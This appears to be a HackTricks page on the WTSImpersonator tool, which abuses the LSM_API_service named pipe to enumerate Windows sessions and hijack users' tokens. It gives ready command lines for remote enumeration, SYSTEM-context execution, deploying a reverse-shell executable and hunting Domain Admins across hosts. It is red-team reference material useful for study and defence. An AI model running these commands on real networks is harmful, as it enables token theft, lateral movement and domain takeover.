{{#include ../../banners/hacktricks-training.md}}

The **WTS Impersonator** tool exploits the **"\\pipe\LSM_API_service"** RPC Named pipe to stealthily enumerate logged-in users and hijack their tokens, bypassing traditional Token Impersonation techniques. This approach facilitates seamless lateral movements within networks. The innovation behind this technique is credited to **Omri Baso, whose work is accessible on [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Core Functionality

The tool operates through a sequence of API calls:

```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```

### Key Modules and Usage

- **Enumerating Users**: Local and remote user enumeration is possible with the tool, using commands for either scenario:

  - Locally:
    ```bash
    .\WTSImpersonator.exe -m enum
    ```
  - Remotely, by specifying an IP address or hostname:
    ```bash
    .\WTSImpersonator.exe -m enum -s 192.168.40.131
    ```

- **Executing Commands**: The `exec` and `exec-remote` modules require a **Service** context to function. Local execution simply needs the WTSImpersonator executable and a command:

  - Example for local command execution:
    ```bash
    .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
    ```
  - PsExec64.exe can be used to gain a service context:
    ```bash
    .\PsExec64.exe -accepteula -s cmd.exe
    ```

- **Remote Command Execution**: Involves creating and installing a service remotely similar to PsExec.exe, allowing execution with appropriate permissions.

  - Example of remote execution:
    ```bash
    .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
    ```

- **User Hunting Module**: Targets specific users across multiple machines, executing code under their credentials. This is especially useful for targeting Domain Admins with local admin rights on several systems.
  - Usage example:
    ```bash
    .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
    ```

{{#include ../../banners/hacktricks-training.md}}



